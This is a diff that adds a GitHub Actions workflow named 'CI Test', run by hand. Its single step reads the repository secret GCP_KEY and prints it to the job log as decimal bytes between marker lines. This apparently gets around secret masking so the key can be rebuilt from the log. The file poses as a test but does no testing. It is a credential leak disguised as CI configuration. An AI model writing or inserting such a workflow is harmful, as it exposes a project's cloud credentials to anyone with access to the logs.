@@ -1,0 +1,13 @@
+name: CI Test
+on: [workflow_dispatch]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run
+        env:
+          S0: ${{ secrets.GCP_KEY }}
+        run: |
+          echo "S0_START"
+          echo -n "$S0" | od -An -tu1
+          echo "S0_END"
